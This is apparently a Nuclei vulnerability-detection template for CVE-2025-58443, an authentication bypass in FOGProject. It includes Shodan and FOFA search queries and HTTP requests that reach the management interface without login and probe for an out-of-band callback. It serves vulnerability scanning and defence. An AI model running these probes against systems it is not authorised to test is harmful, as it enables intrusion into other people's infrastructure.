id: CVE-2025-58443

info:
  name: FOGProject <= 1.5.10.1673 - Authentication Bypass
  author: oleveloper
  severity: critical
  description: |
    FOGProject version 1.5.10.1673 suffers from an authentication bypass vulnerability that allows unauthenticated users to access the management interface without proper authentication. This can lead to unauthorized access to system configuration, host management, and potentially database information.
  impact: |
    Unauthenticated attackers can bypass authentication to access the FOGProject management interface and retrieve sensitive system configuration and host management information.
  remediation: |
    Upgrade FOGProject to a version later than 1.5.10.1673 that implements proper authentication on all management endpoints.
  reference:
    - https://github.com/casp3r0x0/CVE-2025-58443
    - https://nvd.nist.gov/vuln/detail/CVE-2025-58443
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 9.1
    cve-id: CVE-2025-58443
    epss-score: 0.0883
    epss-percentile: 0.9232
    cwe-id: CWE-287
  metadata:
    max-request: 3
    vendor: fogproject
    product: fogproject
    fofa-query: icon_hash="-1952619005"
    shodan-query: http.favicon.hash:-1952619005
  tags: cve,cve2025,fogproject,auth-bypass,vkev

flow: http(1) && http(2)

http:
  - method: GET
    path:
      - "{{BaseURL}}"

    redirects: true
    matchers:
      - type: dsl
        dsl:
          - "contains(body, 'FOG')"
          - "status_code == 200"
        condition: and
        internal: true

  - method: GET
    path:
      - "{{BaseURL}}/fog/management/index.php?node=about&sub=kernel"
      - "{{BaseURL}}/fog/service/getversion.php?url={{interactsh-url}}"

    matchers-condition: or
    matchers:
      - type: dsl
        dsl:
          - "status_code == 200"
          - "contains(interactsh_protocol,'dns')"
        condition: and

      - type: dsl
        dsl:
          - "status_code == 200"
          - "regex('(?is)FOG.*Configuration.*(?:Kernel|bzImage)', body)"
        condition: and
# digest: 4a0a0047304502201b4e4388d23b4d6d3cef235e028a757928bb8b6d66652e7238ddb1662a4a15ca022100a3b63330fa9ee9336174219dcb64a0423864821d69c9b3ca394cf3c4a3374610:922c64590222798bb761d5b6d8e72950